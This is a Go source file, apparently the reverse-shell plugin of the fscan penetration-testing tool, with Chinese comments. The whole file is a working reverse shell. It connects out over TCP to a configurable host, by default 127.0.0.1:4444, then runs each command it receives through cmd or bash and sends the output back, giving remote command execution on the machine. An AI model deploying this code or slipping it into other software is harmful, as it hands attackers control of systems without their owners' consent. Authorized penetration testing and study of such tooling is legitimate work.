//go:build (plugin_reverseshell || !plugin_selective) && !no_local

package local

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// ReverseShellPlugin 反向Shell插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现反弹Shell功能
// - 保持原有功能逻辑
type ReverseShellPlugin struct {
	plugins.BasePlugin
}

// NewReverseShellPlugin 创建反弹Shell插件
func NewReverseShellPlugin() *ReverseShellPlugin {
	return &ReverseShellPlugin{
		BasePlugin: plugins.NewBasePlugin("reverseshell"),
	}
}

// GetName 实现Plugin接口

// Scan 执行反弹Shell - 直接实现
func (p *ReverseShellPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	var output strings.Builder

	// 从config获取配置
	target := config.LocalExploit.ReverseShellTarget
	if target == "" {
		target = "127.0.0.1:4444"
	}

	// 解析目标地址
	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		host = target
		portStr = "4444"
	}

	port, err := strconv.Atoi(portStr)
	if err != nil {
		port = 4444
	}

	output.WriteString("=== Go原生反弹Shell ===\n")
	output.WriteString(fmt.Sprintf("目标: %s\n", target))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 启动反弹Shell
	err = p.startNativeReverseShell(ctx, host, port, state)
	if err != nil {
		output.WriteString(fmt.Sprintf("反弹Shell错误: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString("✓ 反弹Shell已完成\n")
	common.LogSuccess(i18n.Tr("reverseshell_complete", target))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// startNativeReverseShell 启动Go原生反弹Shell
func (p *ReverseShellPlugin) startNativeReverseShell(ctx context.Context, host string, port int, state *common.State) error {
	// 连接到目标
	conn, err := net.Dial("tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("连接失败: %w", err)
	}
	defer func() { _ = conn.Close() }()

	common.LogSuccess(i18n.Tr("reverseshell_connected", host, port))

	// 设置反弹Shell为活跃状态
	state.SetReverseShellActive(true)
	defer func() {
		state.SetReverseShellActive(false)
	}()

	// 发送欢迎消息
	welcomeMsg := fmt.Sprintf("Go Native Reverse Shell - %s/%s\n", runtime.GOOS, runtime.GOARCH)
	_, _ = conn.Write([]byte(welcomeMsg))
	_, _ = conn.Write([]byte("Type 'exit' to quit\n"))

	// 创建读取器
	reader := bufio.NewReader(conn)

	for {
		// 检查上下文取消
		select {
		case <-ctx.Done():
			_, _ = conn.Write([]byte("Shell session terminated by context\n"))
			return ctx.Err()
		default:
		}

		// 发送提示符
		prompt := fmt.Sprintf("%s> ", getCurrentDir())
		_, _ = conn.Write([]byte(prompt))

		// 设置读取超时，以便能响应 ctx 取消
		_ = conn.SetReadDeadline(time.Now().Add(1 * time.Second))

		// 读取命令
		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				return nil
			}
			// 超时继续循环检查 ctx
			var netErr net.Error
			if errors.As(err, &netErr) && netErr.Timeout() {
				continue
			}
			return fmt.Errorf("读取命令错误: %w", err)
		}

		// 清理命令
		cmdLine = strings.TrimSpace(cmdLine)
		if cmdLine == "" {
			continue
		}

		// 检查退出命令
		if cmdLine == "exit" {
			_, _ = conn.Write([]byte("Goodbye!\n"))
			return nil
		}

		// 执行命令
		result := p.executeCommand(cmdLine)

		// 发送结果
		_, _ = conn.Write([]byte(result + "\n"))
	}
}

// executeCommand 执行系统命令
func (p *ReverseShellPlugin) executeCommand(cmdLine string) string {
	var cmd *exec.Cmd

	// 根据操作系统选择命令解释器
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/C", cmdLine)
	case "linux", "darwin":
		cmd = exec.Command("bash", "-c", cmdLine)
	default:
		return fmt.Sprintf("不支持的操作系统: %s", runtime.GOOS)
	}

	// 执行命令并获取输出
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("错误: %v\n%s", err, string(output))
	}

	return string(output)
}

// getCurrentDir 获取当前目录
func getCurrentDir() string {
	dir, err := os.Getwd()
	if err != nil {
		return "unknown"
	}
	return dir
}

// 注册插件
func init() {
	RegisterLocalPlugin("reverseshell", func() Plugin {
		return NewReverseShellPlugin()
	})
}
